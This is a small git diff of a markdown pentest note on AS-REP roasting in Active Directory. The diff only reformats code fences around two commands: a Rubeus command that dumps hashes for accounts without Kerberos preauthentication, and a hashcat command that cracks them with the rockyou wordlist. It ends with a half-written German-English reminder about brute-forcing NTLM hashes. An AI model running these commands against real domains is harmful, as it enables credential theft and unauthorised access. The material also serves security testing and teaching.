@@ -57,11 +57,11 @@ This results in any user who has the correct name of that account to be able to 
 
 We can use [Rubeus](https://github.com/GhostPack/Rubeus) on a domain joined machine to find all accounts on that domain where **Do not require Kerberos preauthentication** is set and have it return the corresponding hashes. The **/format** options will directly give us output that is crackable with [hashcat](https://github.com/hashcat/hashcat).
 
-´´´Rubeus.exe asreproast /format:hashcat´´´
+````Rubeus.exe asreproast /format:hashcat````
 
 The AS-REP hash can then be fed into hashcat.
 
-´´´hashcat64.exe -m 18200 '$krb5asrep$23$...' -a 0 c:\wordlists\rockyou.txt´´´
+````hashcat64.exe -m 18200 '$krb5asrep$23$...' -a 0 c:\wordlists\rockyou.txt````
 
 
 HOW wordlists & Bruteforces mit dem NTLM hash ggf. noch tools.
